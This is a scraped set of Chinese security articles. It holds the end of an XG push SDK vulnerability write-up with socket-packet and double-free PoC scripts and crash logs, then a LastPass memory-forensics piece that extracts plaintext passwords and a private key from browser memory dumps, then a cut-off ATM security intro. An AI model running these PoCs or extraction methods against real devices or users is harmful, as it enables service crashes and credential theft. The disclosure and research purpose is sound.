0x3B9AC9FF &amp;&amp; dword_4005D018 )      {        v23 = HIDWORD(v12);        j_j___android_log_print(6, ""xguardian"", ""error accessid:%llu"");      }      if ( v9 &amp;&amp; v11 )      {        v13 = &amp;dword_4005E028;                  // xgapp_info结构体存储的起始地址        for ( j = &amp;dword_4005E028; ; j = v15 )        {          v14 = (const char *)v13[2];          v15 = v13;          if ( !v14 )            break;          if ( !j_j_strcmp(v9, v14) )          {            *v13 = v27;            v13[1] = HIDWORD(v27);            v16 = 1;            *((_BYTE *)v15 + 12) = 1;            v15 = j;            goto LABEL_22;          }          if ( *((_BYTE *)v13 + 12) )            v15 = j;          v13 += 4;          if ( v13 == dword_40060028 )            break;                              // 最多只能存储512个对象，每个对象占用16字节        }        v16 = 0;LABEL_22:          if ( dword_4005D018 )          j_j___android_log_print(4, ""xguardian"", ""found %d, pkgName:%s,accid:%s"", v16, v9, v11);        if ( !v16 &amp;&amp; sub_40055B98(v9) )        {          if ( dword_4005D018 )            j_j___android_log_print(4, ""xguardian"", ""try to add to the unstall list"");          v17 = j_j_strlen(v9) + 1;          v18 = (void *)v15[2];          if ( v18 )          {j_j__ZdaPv:              operator delete[](v18);             / *  * 这段存在问题，v18没有置为null。导致当循环到512个对象的时候，由于前面循环的限制，v18    还是指向第512个对象中在堆上分配的packagename的地址，此时v18会被delete。当512以上的多个命令数据达到，需要有多个packagename需要添加时，由于并发处理，程序会在返回之前再次运行到此处，v18还是指向同一地址，由于v18已被delete，此时会再次delete一下，从而导致delete出错 * */            return;          }          v19 = (void *)j_operator new[](v17);          v15[2] = (int)v19;          j_j_memset(v19, 0, v17);          j_j_memcpy((void *)v15[2], v9, v17);          *(_BYTE *)(v15[2] + v17) = 0;          v20 = j_j_atoll(v11);          *((_BYTE *)v15 + 12) = 1;          *(_QWORD *)v15 = v20;          if ( dword_4005D018 )            j_j___android_log_print(4, ""xguardian"", ""add new unInfo pkgName:%s,accid:%llu"", v15[2], v20);        }      }    }    v18 = (void *)dword_40060028[i];    if ( v18 )      goto j_j__ZdaPv;  }…对通过socket端口传入的xgapplist命令的解析主要包括以下几个步骤：解析分号的分隔，获得每个xg app的信息；解析逗号的分隔，获得xg app packagename和accid；从0x4005E028开始，依次存储解析xgappinfo得到的结果，分别为accid、packagename、status，从而构成xgappinfo_list；当再次传入xgapplist命令时，会将传入的packagename与已存储的packagename比较。如果不同，说明是新的packagename，则会在堆上分配地址存储，并将这个堆上分配的地址添加到xgappinfo_list中。如果相同，不进行添加。最多只能添加到0x40060028这个地址，到这个地址会跳出循环，也就是最多只能添加(0x40060028-0x4005E028)/16=512个xgappinfo结构体注意下面这段代码if ( v18 )            {j_j__ZdaPv:              operator delete[](v18);}v18为下一个未分配区域的packagename，XG SDK认为如果不为空，则表明已在堆上分配，因此需要delete。然而测试表明，当添加xgappinfo超过512，为518、519等多个时（注意：并非超过1个），可以触发堆内存破坏。POC:from pwn import *  import sysdef open_connection():      xg_daemon_server = ""192.168.8.158""    xg_listen_port = 55362    conn = remote(xg_daemon_server, xg_listen_port)    return conndef send_debug():      conn = open_connection()    packet_debug = ""debug:1\n""    conn.send(packet_debug)    print ""S:""+packet_debug    conn.close()    exit(0)def send_heap_overflow(n):      conn = open_connection()    packet_bound_overflow = ""xgapplist:../../../""    for i in range(n):        packet_bound_overflow +=""/""    packet_bound_overflow +=""sdcard/, 2100178385\n""    print ""S: ""+packet_bound_overflow    print ""%d bytes"" % len(packet_bound_overflow)    conn.send(packet_bound_overflow)    conn.close()def send_normal_packet(packet):      conn = open_connection()    conn.send(packet)    print ""S: ""+packet    if (packet == ""ver:\n""):        print ""R: ""+ conn.recv()    conn.close()    exit(0)def main():      if (len(sys.argv) != 2):        print """"""           %s &lt;packet_type&gt;           1: send debug packet           3: send heap overflow packet           4: send normal ver: packet           5: send normal tme:12345 packet           6: send normal xgapplist: packet        """""" % sys.argv[0]        exit(-1)    if(sys.argv[1] == ""1""):        send_debug()    elif(sys.argv[1] == ""3""):        for i in range(518):  //notice！            send_heap_overflow(i)            print i        exit(0)    elif(sys.argv[1] == ""4""):        send_normal_packet(""ver:\n"")    elif(sys.argv[1] == ""5""):        send_normal_packet(""tme:12345\n"")    elif(sys.argv[1] == ""6""):        send_normal_packet(""xgapplist:\n"")    else:        print ""unkown packet type! ""if __name__ == ""__main__"":      main()LogcatI/TpnsWatchdog(  495): server get unstall appinfo:com.tencent.wework,2100178384;../../../././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.  I/TpnsWatchdog(  495): found 0, pkgName:com.tencent.wework,accid:2100178384  I/TpnsWatchdog(  495): try to add to the unstall list  F/libc    (  495): invalid address or address of corrupt block 0x4125f850 passed to dlfree  F/libc    (  495): Fatal signal 11 (SIGSEGV) at 0xdeadbaad (code=1), thread 495 (xg_watchdog)  I/DEBUG   (  241): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***  I/DEBUG   (  241): Build fingerprint: 'google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys'  I/DEBUG   (  241): Revision: '11'  I/DEBUG   (  241): pid: 495, tid: 495, name: xg_watchdog  &gt;&gt;&gt; /data/data/com.tencent.wework/lib/libtpnsWatchdog.so &lt;&lt;&lt;  I/DEBUG   (  241): AM write failure (32 / Broken pipe)  I/DEBUG   (  241): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr deadbaad  I/DEBUG   (  241): Abort message: 'invalid address or address of corrupt block 0x4125f850 passed to dlfree'  W/NativeCrashListener(  960): Couldn't find ProcessRecord for pid 495  I/DEBUG   (  241):     r0 00000000  r1 40139c5e  r2 deadbaad  r3 4013d7a0  I/DEBUG   (  241):     r4 4125f850  r5 40148180  r6 4121c000  r7 4125f858  I/DEBUG   (  241):     r8 400cc0d9  r9 00000000  sl 00000000  fp bee458ec  I/DEBUG   (  241):     ip 00000001  sp bee41710  lr 4010b6cb  pc 4010b6cc  cpsr 600f0030  I/DEBUG   (  241):     d0  2064657373617064  d1  6120726f2073736c  I/DEBUG   (  241):     d2  6f20737365726466  d3  707572726f632072  I/DEBUG   (  241):     d4  2e2f2e2f2e2f2e2f  d5  2e2f2e2f2e2f2e2f  I/DEBUG   (  241):     d6  2e2f2e2f2e2f2e2f  d7  2e2f2e2f2e2f2e2f  I/DEBUG   (  241):     d8  0000000000000000  d9  0000000000000000  I/DEBUG   (  241):     d10 0000000000000000  d11 0000000000000000  I/DEBUG   (  241):     d12 0000000000000000  d13 0000000000000000  I/DEBUG   (  241):     d14 0000000000000000  d15 0000000000000000  I/DEBUG   (  241):     d16 41c3183f70f5e354  d17 3f50624dd2f1a9fc  I/DEBUG   (  241):     d18 41c05bc240800000  d19 0000000000000000  I/DEBUG   (  241):     d20 0000000000000000  d21 0000000000000000  I/DEBUG   (  241):     d22 0000000000000000  d23 0000000000000000  I/DEBUG   (  241):     d24 0000000000000000  d25 0000000000000000  I/DEBUG   (  241):     d26 0000000000000000  d27 0000000000000000  I/DEBUG   (  241):     d28 0000000000000000  d29 0000000000000000  I/DEBUG   (  241):     d30 0000000000000000  d31 0000000000000000  I/DEBUG   (  241):     scr 00000010  I/DEBUG   (  241):  I/DEBUG   (  241): backtrace:  I/DEBUG   (  241):     #00  pc 000116cc  /system/lib/libc.so (dlfree+1191)  I/DEBUG   (  241):     #01  pc 0000dc0b  /system/lib/libc.so (free+10)  I/DEBUG   (  241):     #02  pc 000016b5  /data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so  I/DEBUG   (  241):     #03  pc 00002787  /data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so  I/DEBUG   (  241):     #04  pc 0000124f  /data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so  I/DEBUG   (  241):     #05  pc 0000e34b  /system/lib/libc.so (__libc_init+50)  I/DEBUG   (  241):     #06  pc 00001390  /data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so  I  为什么513、514不能触发呢？这个问题一直没有分析得很清楚，因此也没有选择提交，直至厂商对前面两个漏洞进行修复，再次复现这个漏洞的难度加大。再次观察漏洞的触发位置，if ( v18 )            {j_j__ZdaPv:              operator delete[](v18);}可以发现v18 被delete后并没有置为null，那么有没有可能v18会被delete多次呢？作为socket服务daemon，程序使用了epoll系统调用，因此可以猜想这是并发处理的原因。在没有并发的情况下依次传入要添加的xgappinfo，在超过512个xgappinfo时，循环直接跳出，不会尝试添加这个xgappinfo，不会触及到下面delete所在的分支，这也是很长时间我通过调试很难复现该漏洞的原因。但如果存在并发，特别是在即将超过512个xgappinfo时，又传入了多个要添加的xgappinfo，那么由于并发处理，程序会同时尝试添加多个xgappinfo且不会认为超过了512个xgappinfo，此时v18均指向同一地址（即第512个对象中在堆上分配的packagename的地址），那么在v18被delete一次的情况下，紧接着会再次delete一下，从而导致delete出错。0x06 后续腾讯很快对命令注入和空指针解引用引发的远程拒绝服务漏洞进行了修复，主要修复点包括：Socket端口监听任意地址改为监听本地地址。对Socket端口传入的命令进行了加密。对传入xgapplist中的packagename进行了过滤，特别是过滤了“/”字符，防止目录穿越。这些防御措施导致我很难再复现最后一个堆内存破坏漏洞了，但通过深入分析，我们仍然可以通过编写手机上运行的本地代码添加手机上已存在的packagename，要超过512个破解加密算法来予以一一破解。首先，在手机上安装512个packganame(Oh my god! )，这个可以通过脚本解决。#!/bin/bash# Generate 512 apks, Build and InstallCURDIR=$(pwd)  for i in $(seq 512)  do      cd $CURDIR    DIR=""HelloWorld""$i    PACKAGE=""com.ms509.helloworld""$i    UNSIGNED_APK=$DIR""-release-unsigned.apk""    SIGNED_APK=$i"".apk""    android create project -n $DIR -t 13 -p $DIR -k $PACKAGE -a helloworld    cd $CURDIR""/""$DIR    ant release    cd $CURDIR""/""$DIR""/bin""# sign apk    signapk.sh $UNSIGNED_APK $SIGNED_APK    adb install $SIGNED_APKdone  其次，破解加密算法可以直接调用程序使用的加解密库，而不必真的破解。最后的POC关键代码如下，注意，我们在快超过512时sleep了一下，使XG SDK的处理能力跟上，然后后面再传入多个xgappinfo，这样有更大的几率触发并发。directSendContent(""debug:1"");  directSendContent(""ver:"");  Log.d(""testXG"", ""[+] Adding ""+Integer.toString(m_appNameList.size()) + ""fake xg apps"");  int i = 0;  for (String xgapp:m_appNameList) {      if ((i++) &amp;gt; 530)        break;    String cmd = ""xgapplist:"" + xgapp + "","" +            Integer.toString((int)(Math.random()*1000000)) + "";"";    Log.d(""testXG"", ""[+] "" + Integer.toString(i) + "" Sending command: "" + cmd);    if (i == 510) {        try {            sleep(1000);        } catch (InterruptedException e){        }    }    directSendContent(cmd);Logcat:I/xguardian(19448): scanAppStatus node:508, pkg:heenstudy.com.sniffclipboard, accid:917429, status:1  I/xguardian(19448): scanAppStatus node:509, pkg:com.estrongs.android.taskmanager, accid:230582, status:1  I/xguardian(19448): scanAppStatus node:510, pkg:com.ilegendsoft.mercury, accid:995063, status:1  I/xguardian(19448): scanAppStatus node:511, pkg:fq.router2, accid:619048, status:1  I/xguardian(19448): xg app list size total:512, xgAppsCacheCount:512, xgAppsCacheActivityStatusCount:512  I/xguardian(19448): countTimeout=0, wait_time=310000, nfds=1, xgAppsCacheCount=512  I/xguardian(19448): server accept client 2, 127.0.0.1  I/xguardian(19448): countTimeout=0, wait_time=310000, nfds=1, xgAppsCacheCount=512  I/xguardian(19448): server decrpty receive from client: 42 : xgapplist:easyre.sjl.gossip.easyre,512970;  I/xguardian(19448): server get unstall appinfo:easyre.sjl.gossip.easyre,512970;  E/xguardian(19448): error accessid:512970  I/xguardian(19448): found 0, pkgName:easyre.sjl.gossip.easyre,accid:512970  I/xguardian(19448): try to add to the unstall list  E/testXG  (10149): [+] response: -1  F/libc    (19448): invalid address or address of corrupt block 0x401120c8 passed to dlfree  F/libc    (19448): Fatal signal 11 (SIGSEGV) at 0xdeadbaad (code=1), thread 19448 (xg_watchdog)  I/DEBUG   (  242): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***  I/DEBUG   (  242): Build fingerprint: 'google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys'  I/DEBUG   (  242): Revision: '11'  I/DEBUG   (  242): pid: 19448, tid: 19448, name: xg_watchdog  &gt;&gt;&gt; /data/data/com.qufenqi.android.quwallet/lib/libxguardian.so &lt;&lt;&lt;  I/DEBUG   (  242): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr deadbaad  I/DEBUG   (  242): AM write failure (32 / Broken pipe)  I/DEBUG   (  242): Abort message: 'invalid address or address of corrupt block 0x401120c8 passed to dlfree'  I/DEBUG   (  242):     r0 00000000  r1 400b5c5e  r2 deadbaad  r3 400b97a0  I/DEBUG   (  242):     r4 401120c8  r5 400c4180  r6 4010e000  r7 401120d0  I/DEBUG   (  242):     r8 40047221  r9 00000000  sl 00000000  fp bec758dc  I/DEBUG   (  242):     ip 00000001  sp bec6f6f8  lr 400876cb  pc 400876cc  cpsr 600f0030  I/DEBUG   (  242):     d0  2064657373617064  d1  6f2073736572646c  I/DEBUG   (  242):     d2  707572726f632066  d3  206b636f6c622072  I/DEBUG   (  242):     d4  0000000000000000  d5  0000000000000000  I/DEBUG   (  242):     d6  0000000000000000  d7  0000000000000000  I/DEBUG   (  242):     d8  0000000000000000  d9  0000000000000000  I/DEBUG   (  242):     d10 0000000000000000  d11 0000000000000000  I/DEBUG   (  242):     d12 0000000000000000  d13 0000000000000000  I/DEBUG   (  242):     d14 0000000000000000  d15 0000000000000000  I/DEBUG   (  242):     d16 41c9ef5dd3bd0e56  d17 3f50624dd2f1a9fc  I/DEBUG   (  242):     d18 41ba01d435000000  d19 0000000000000000  I/DEBUG   (  242):     d20 0000000000000000  d21 0000000000000000  I/DEBUG   (  242):     d22 0000000000000000  d23 0000000000000000  I/DEBUG   (  242):     d24 0000000000000000  d25 0000000000000000  I/DEBUG   (  242):     d26 0000000000000000  d27 0000000000000000  I/DEBUG   (  242):     d28 0000000000000000  d29 0000000000000000  I/DEBUG   (  242):     d30 0000000000000000  d31 0000000000000000  I/DEBUG   (  242):     scr 00000010  I/DEBUG   (  242):  I/DEBUG   (  242): backtrace:  I/DEBUG   (  242):     #00  pc 000116cc  /system/lib/libc.so (dlfree+1191)  I/DEBUG   (  242):     #01  pc 0000dc0b  /system/lib/libc.so (free+10)  I/DEBUG   (  242):     #02  pc 000026e7  /data/app-lib/com.qufenqi.android.quwallet-2/libxguardian.so  I/DEBUG   (  242):     #03  pc 00002ff7  /data/app-lib/com.qufenqi.android.quwallet-2/libxguardian.so  I/DEBUG   (  242):     #04  pc 000013b1  /data/app-lib/com.qufenqi.android.quwallet-2/libxguardian.so  I/DEBUG   (  242):     #05  pc 0000e34b  /system/lib/libc.so (__libc_init+50)  I/DEBUG   (  242):     #06  pc 000014fc  /data/app-lib/com.qufenqi.android.quwallet-2/libxguar  当然，这个double free漏洞无法利用，因为堆中的内容只能为手机上安装的packagename，所以尽管克服重重困难破解了加密算法、安装了512个packagename，仍然只是一个local DoS。TSRC在最先评级认为是代码执行，后面也更正为了local DoS。最后，总结下漏洞的成因，XG SDK以检查/data/data//lib的存在，来判断是否为使用XG sdk的app，这种方式不够严谨。依然有可能被恶意app利用来保活（ 因为XG sdk后续要启动app的服务），占用系统资源或者妨碍正常使用推送服务的app。","2016-12-05 16:24:27","移动安全","一个目录穿越引发的注入及后续——XG SDK漏洞回顾与思考","http://nsoad.com/Article/MobileSecurity/20161205/882.html"
"5ccbfae44f2f0a0a7a69c0da","简介首先必须要说，这并不是LastPass的exp或者漏洞，这仅仅是通过取证方法提取仍旧保留在内存中数据的方法。之前我阅读《内存取证的艺术》（The Art of Memory Forensics）","Kender","简介首先必须要说，这并不是LastPass的exp或者漏洞，这仅仅是通过取证方法提取仍旧保留在内存中数据的方法。之前我阅读《内存取证的艺术》（The Art of Memory Forensics）时，其中有一章节就有讨论从浏览器提取密码的方法。当你使用标准的用户名/密码方式登录一个网页，通常会发送一个包含了你的用户名及密码的post请求，这些都是以明文方式发送（这里不过多讨论SSL，在SSL内部也是明文发送的）。本文描述如何找到这些post请求并提取信息，当然如果你捕获到浏览器登录，这些方法就很实用。但是事与愿违，捕获到这类会话的概率很低。在我阅读这本书的时候，我看了看我的浏览器。发现我的Lastpass插件图标显示了一个1，它代表着在当前站点中我有保存一个凭证。但大多数情况如果在选项卡中加载一个保存有凭证的网站，不论是什么页面插件图标都会进行提示。设置我想在内存中完成所有的事情，这也意味着我需要找到一个简单且可重复的方法来进行变化，着眼于内存来寻找数据。按照通常的做法就是每次创建一个mem dump，但我使用虚拟机来进行就显得异常的简单。当我需要做出变化时，所要做的就是每次创建一个快照。之后我还保留了一份在那个时间点的内存副本，用来与其他快照进行比较。剩下的操作就更简单了。安装浏览器，Chrome, IE以及Firefox，设置一个LastPass账户并填写几个站点登录使用的用户名密码。我们先从浏览器插件开始入手，把所有的设置都设置成默认方式，然后使用这个插件生成并储存不同长度的密码。所有密码仅使用大小写混合的字母数字。同时我也将这些密码保存在本机的一份文档中，以便我们之后更方便的进行验证。待所有的密码都存储到Lastpass，且本地副本保存好之后。将所有账户注销，清除所有的历史文件和临时文件，最后重启机器。方法一开始还是挺简单的，从寻找限制开始就变得很复杂了。基本上步骤如下：打开浏览器登录LastPass插件登录网站检测内存中明文密码的所在改变操作++ 关闭选项卡++ 重新打开选项卡++ 注销+重复实验测试1我知道所有的用户名和密码，我用临时账户登录了第一个站点Facebook。通过Facebook的导航我点开几个网页之后，保持浏览器选项卡打开状态，我创建了一个快照。第一次搜索很简单。grep -a 03rRJaYNMuoXG7hs Win7x64-MemTesting-Snapshot3.vmem | strings &gt; ~/Desktop/fb.txt-a参数告知grep将mem二进制文件视为文本文件，并以字符串形式输出到文本文件中。最后得到的文本文件就可以清晰的看到这些信息跟着我一起嘿嘿嘿{""reqinfo"":{""from"":""fillfield_A"",""index"":28,""time"":1475875701411,""uniqid"":85097549},""docid"":0,""sharedsite"":0,""automaticallyFill"":1,""is_launch"":false,""manualfill"":false,""name"":""pass"",""value"":""O3rRJaYNMuoXG7hs"",""type"":""password"",""checked"":false,""otherfield"":false,""doconfirm"":1,""allowforce"":0,""from_iframe"":0,""humanize"":false,""v2humanize"":false,""delayquants"":0,""force_fillbest"":false,""originator"":""FILL_F4"",""cmd"":""fillfield"",""clearfilledfieldsonlogoff"":0,""dontfillautocompleteoff"":0,""realurl"":""https://www.facebook.com/"",""aid"":""607245038900433242"",""tabid"":2,""custom_js"":"""",""domains"":""facebook.com,facebook.com,messenger.com"",""formname"":"""",""topurl"":""https://www.facebook.com/"",""urlprefix"":""chrome-extension://hdokiejnpimakedhajhdlcegeplioahd/"",""lplanguage"":""""}密码：passO3rRJaYNMuoXG7hspassword获得密码，网站名称，时间戳以及很多其他相关相关信息的JSON数据。这是表单字段自动填充造成的现象。第二个测试看起来不太合拍，但不管怎样多条路选择总是好的。测试2第二个快照是几个已经登录完成的网站，且选项卡保持开启。遵循之前的操作在关闭之前注销所有账户然后再启动虚拟机。再次确认内存清理干净，此外还得确认浏览器本身没有保存这些数据，所以我将历史数据全部删了。从下面这张截图中你可以看到，除了QNAP站点之外其他的站点都已加载完毕并且登录。回到主页你可以看到LastPass插件提示存在一个匹配的凭证，但是我还没有加载一个含有表单字段的页面，所以也就没有出现“自动填充”了。保存好快照之后，对所有加载的网页使用之前的grep命令所有已经登录的网页在内存中都有相同的数据结构:{""reqinfo"":{""from"":""fillfield_A"",""index"":157,""time"":1475878291419,""uniqid"":65765520},""docid"":0,""sharedsite"":0,""automaticallyFill"":1,""is_launch"":false,""manualfill"":false,""name"":""ca414a13646af9ceb5293a5eeded1704"",""value"":""5DAhhkOvZDTC0MYA14"",""type"":""password"",""checked"":false,""otherfield"":false,""doconfirm"":1,""allowforce"":0,""from_iframe"":0,""humanize"":false,""v2humanize"":false,""delayquants"":0,""force_fillbest"":false,""originator"":""FILL_F4"",""cmd"":""fillfield"",""clearfilledfieldsonlogoff"":0,""dontfillautocompleteoff"":0,""realurl"":""http://androidforums.com/login/login/register"",""aid"":""5988558277865511241"",""tabid"":14,""custom_js"":"""",""domains"":""androidforums.com"",""formname"":"""",""topurl"":""http://androidforums.com/"",""urlprefix"":""chrome-extension://hdokiejnpimakedhajhdlcegeplioahd/"",""lplanguage"":""""}同时我也注意到一些其它的数据结构:{""cmd"":""save"",""url"":""https://www.phpbb.com/community/ucp.php?mode=login"",""formdata"":""login\tusername\tpeters.lastpass%40gmail.com\ttext\tseen\nlogin\tpassword\tSG5P2GRgqYeL4nvzi8C1XnZs\tpassword\tseen\nlogin\tautologin\ton-0\tcheckbox\tseen\nlogin\tviewonline\ton-0\tcheckbox\tseen\nlogin\tredirect\t.%2Fucp.php%3Fmode%3Dlogin\thidden\tnotseen\nlogin\tsid\t32ff2e6ecf53aaac43b88f123ad86b04\thidden\tnotseen\nlogin\tredirect\tindex.php\thidden\tnotseen\n0\taction\thttps%3A%2F%2Fwww.phpbb.com%2Fcommunity%2Fucp.php%3Fmode%3Dlogin\taction\n0\tmethod\tpost\tmethod\n"",""current_pw_field_name"":"""",""docnum"":0,""timestamp"":1475878195546,""username"":""peters.lastpass@gmail.com"",""password"":""SG5P2GRgqYeL4nvzi8C1XnZs"",""tld"":""phpbb.com""}这一个可以获得用户名，密码，网站名的明文数据。QNAP站点虽然被加载但是没有填充到表单中所以内存中没有数据。然而我通过内存进行搜索尝试分析其他数据时，我发现了一条有趣的信息。这是一条被称为LastPassPrivateKey的数据，是否我们可以用这个来获取主密码或是解密库文件，或许我们可以在磁盘或者内存中找到它。正当我在考虑如何才能使用这个PrivateKey时，脑中浮现出一幅场景。如果主密码本身就在内存中，为何到现在都还没有发现呢？我假设它只是被清除了，在此之前密码就已经被解密了。事实上使用grep我的确发现了以明文方式出现的用户名及密码，但是这个场景也只在一个快照中出现过。接下来我进行了一连串的变化。打开选项卡，关闭选项卡，恢复选项卡。我得出的结论是如果选项卡中打开的网页已经完成登录，在大多数情况下能够获取到凭证。当恢复选项卡时打开其他的网页，想要找到完整的数据结构就变得很困难了。这些信息依旧在内存中，当然如果你知道其中的值，相对来说要比无头苍蝇乱撞要科学一点点。此时此刻，我有足够的数据可以开始通过使用Volatility插件从内存映像中自动化提取这些凭证。早在几年前，Brian Baskin就发布了一款Volatility插件，其使用yara规则用来搜索进程内存并从中提取数据的插件。这完全符合我的需求啊，原文链接至此就剩下像正则表达式这样简单的事，以及对最后获得的数据进行整理了。运行之后你应该可以获得类似的结果：localadmin@tech-server:~$ vol.py --plugins=/home/localadmin/github/volatility_plugins/lastpass --profile=Win7SP1x86 -f /home/localadmin/Desktop/lastpass-mem.vmem lastpassVolatility Foundation Volatility Framework 2.5Searching for LastPass SignaturesFound pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3400)Found pattern in Process: chrome.exe (3840)Found pattern in Process: chrome.exe (3840)Found pattern in Process: chrome.exe (3840)Found pattern in Process: chrome.exe (3840)Found pattern in Process: chrome.exe (3912)Found pattern in Process: chrome.exe (3912)Found pattern in Process: chrome.exe (3912)Found pattern in Process: chrome.exe (3912)Found pattern in Process: chrome.exe (3912)Found pattern in Process: chrome.exe (3912)Found pattern in Process: chrome.exe (4092)Found pattern in Process: chrome.exe (4092)Found pattern in Process: chrome.exe (4092)Found pattern in Process: chrome.exe (4092)Found pattern in Process: chrome.exe (2036)Found pattern in Process: chrome.exe (2036)Found pattern in Process: chrome.exe (2036)Found LastPass Entry for hackforums.netUserName: peters.lastpassPasword: jRvTpQoTHS4OTclFound LastPass Entry for facebook.comUserName: peters.lastpass@gmail.comPasword: UnknownFound LastPass Entry for sainsburys.co.ukUserName: peters.lastpass@gmail.comPasword: mt5JwaPctWFzBjFound LastPass Entry for leakforums.netUserName: peterslastpassPasword: rmH61HSabrVJ9a2Found LastPass Entry for facebook.com,facebook.com,messenger.comUserName: UnknownPasword: O3rRJaYNMuoXG7hsFound Private KeyLastPassPrivateKey&lt;308204BD020100300D06092A864886F70D0101010500048204A7308204A30201000282010100D0D534BEA030F199144DD4B1B0A69D6462BC13CF074B77CDEC0B4C06D3773B39F0D3353D58732D35809E2A45C9A70B94C366DE4E8B591178F5366A4328C96A82A51E8B1573A9546F859EA6C13EB1E08F1F69749598429244B96AFCAE0787CFC4CC19311D80F90679CE4C395FDBF22F9201381E0AEC345C724E1E61CE8EEE0A37EE38B04D5EEA1AB2562D815242E4D6379D23940ACD800921853787F0F1B37F249DE284780CE1D1FFF10FFCE778CD03A442C7A487C47A27D4F11EE98CF5E8B2AA8A7DEE0710B9C2D430CB33EC747E37298E16103493C6DF8A539F4893F30CCFA74D84E5FC40E1ED39316EA038D16748F58AE873704DD61B028940ECB083E7F1790940D4BD2A01C73DBA4AC26A2BB98CE7A2CDF02011102820100624636F04B62539354D955085321324102818100D05799FCC7514DBFC0DEC6E06E2A8715E9E46911DBBFCC59F1569A82930FDBD195A685C1BF13EABB75B46CC8484EB3771E102E76CE3D3756CEF13666C6581861EE23EC11ABB658BA2F815EF2D406FDD85830F6B599443004CEA4B1A79DAAAAEE86755FE354498C770EF3BE2077DD19EE3E7E53A9935FC0D76BD90D3B887F50575FA01A617A43F5D2C44815098207299381229DDA8F91713B7012D8F29A087A3918A2F76A222BA4202E8A0997D63D1EEF02F246DC0A5C0AC869191B9231DCD6D657FB4E6591DDFAF3026522F84E2D1EF2D5C05289EFF9D7E2F2A722374E0204C8FAA326024DF520B97505146AFB1AF7469B862977B1152430911BFA112E76A51C352D7F1B2C39669B4CF102818100FCFCA8B2F2074C1FB357A859AA583651D5DC9EA0446E0B33A7B41D9B7C9955832BEFB4E2151D17DDB851A1F46B16E26ECC6515BCB1C802DD73DA4ACD89083168E2678DE363EF1B45BAA1BA40F845D8396AFC269503F9A4F04D39271F02819A665D47036F0CA3628D78987102818100CEFC910EF956B3590A9A0907F59EB44CD25FF10032DAFE48C359057F75FBA5AF1CC1C6E11E37CF4F825D0E1540B5DA77FF6777FEE55621C1D0EF85D3C12702150D542A90CC8021FA132EF383835DA4358A0781E168897C779F2DA6A834DA20DBFDA4F643738B4DF6BBDD768947D9EC577466E18100D351EC8A77C7582E0A78C5ACA9D86068BB82D721B0841962F959A25A01FA80FFB765DE228798&gt;LastPassPrivateKeyFound Private KeyLastPassPrivateKey&lt;\x00\xb2\x88\x10\x02N;$\x02&amp;\x00\x00\x00&gt;LastPassPrivateKeylocaladmin@tech-server:~$最后安利一波，你可以在Github找到这个插件。","2016-10-30 17:10:50","系统安全","如何从内存提取LastPass中的账号密码","http://nsoad.com/Article/system/20161030/667.html"
"5ccbfae44f2f0a0a7a69c0db","ATM自动柜员机为人们提供了便捷，现在大家不必去银行就能进行现金交易。用户使用它可以对资金进行敏感操作，当然其中脆弱的通信环节也引来了大量黑客的觊觎。在过去的许多","kong","ATM自动柜员机为人们提供了便捷，现在大家不必去银行就能进行现金交易。用户使用它可以对资金进行敏感操作，当然其中脆弱的通信环节也引来了大量黑客的觊觎。在过去的许多年里，黑客已经发现了多种入侵ATM机的方式，其中不乏暗中进行读卡扫描等物理攻击。同时，他们也在试图探索新的方法来破解ATM软件。在本文中，我们将了解到ATM的工作原理、那些用于ATM机的安全解决方案、渗透ATM机的各种奇技淫巧，以及抵御ATM机黑客的最佳解决办法。ATM机是如何工作的大部分的ATM机都有2个输入点和4个输出点：输入点是读卡器和键盘输出点则是屏幕、收据打印器、现金出纳器和扬声器通常情况下，ATM机会直连到后端的服务器（主机开关），主机开关又会跟银行网络进行交互，然后返回消息给ATM机。那么，当用户插入银行卡取现金的时候，会发生点什么呢？用户的账户信息储存在卡背面的磁条里，当他们把卡插入读卡器时，ATM机就会开始读取卡磁条里的信息。这张卡的数据会被发送到主机开关，最后再被转发到银行网络。在这种银行卡通过认证后，用户就需要通过键盘输入密码，接着密码就会被加密然后发送到主机开关。最后，那张卡的信息和密码会同时被发送到银行网络供系统验证，一旦验证成功，主机开关就会将响应码返回给ATM机。接着用户就得输入需要操作的现金数额，然后请求会被发送到主机开关，最后再被转发到银行网络去验证资金账户是否充足。一旦后端账户的资金转移完成，主机开关会发送批准码给ATM机，命令它给予用户现金。ATM机系统里的应用会指示机器提供现金，它自身的机制也会让它在提款时进行计数。至于那些交易相关数据，如账户号、交易ID、交易时间、交易额、钞票面额等等，都会被计入日志文件中，这个日志文件通常被称为EJ日志。在检测程序执行的过程中，ATM机的传感器会去扫描钞票的厚度，防止有折叠或者粘在一起的钞票。如果发生了这种情况，这类钞票会被转移到隔离地带。ATM机的安全随着ATM机个体的增加，它们更加容易遭到不怀好意的人觊觎。同时，许多ATM机仍在使用windows 